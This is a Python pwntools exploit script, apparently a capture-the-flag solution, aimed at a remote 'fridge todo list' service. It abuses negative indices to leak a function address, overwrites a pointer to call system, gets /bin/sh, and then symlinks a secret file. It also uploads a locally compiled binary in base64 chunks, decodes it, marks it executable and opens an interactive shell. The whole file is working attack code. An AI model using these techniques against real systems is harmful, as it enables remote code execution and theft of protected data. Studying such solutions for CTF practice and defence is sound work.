from pwn import *
import binascii
import struct
import os
import base64

BINARY_NAME = 'program.out'

def readall(conn):
    s = ''
    while True:
        line = conn.readline(timeout=1)
        if not line:
            break
        s += line
    return s 

def writeall(conn, data):
    print data
    conn.sendline(data)

def talk(conn, data):
    writeall(conn, data)
    print readall(conn)

conn = remote('fridge-todo-list.ctfcompetition.com', 1337)
readall(conn)
talk(conn, 'hello')
talk(conn, '2')
conn.sendline('-6')
write_func_addr = struct.unpack('<Q', conn.readline().split(':')[-1][1:].ljust(8, '\x00'))[0]
print 'Write func: %08X' % (write_func_addr)
readall(conn)
system_func_addr = write_func_addr + 0x30
talk(conn, '3')
talk(conn, '-4')
talk(conn, '0'*8 + struct.pack('<Q', system_func_addr))
talk(conn, '/bin/sh')
talk(conn, 'mkdir /tmp/exploit; mkdir /tmp/exploit/dev')
talk(conn, 'ln -s /secret_cake_recipe /tmp/exploit/dev/console')

os.system('gcc program.c -o %s' % (BINARY_NAME))
binary_data = open(BINARY_NAME, 'rb').read()
b64_encoded = base64.b64encode(binary_data)

for i in range(0, len(b64_encoded), 0x1024):
    conn.sendline('printf \'%s\' >> /tmp/exploit/exec.b64' % (b64_encoded[i:i+0x1024]))
    #print conn.recvuntil('>')
talk(conn, 'cat /tmp/exploit/exec.b64 | base64 -d > /tmp/exploit/exec')
talk(conn, 'chmod +x /tmp/exploit/exec')
talk(conn, 'cd /tmp/exploit')
#talk(conn, './exec')
conn.interactive()
#talk(conn, addr)
#talk(conn, '/bin/sh')
#conn.interactive()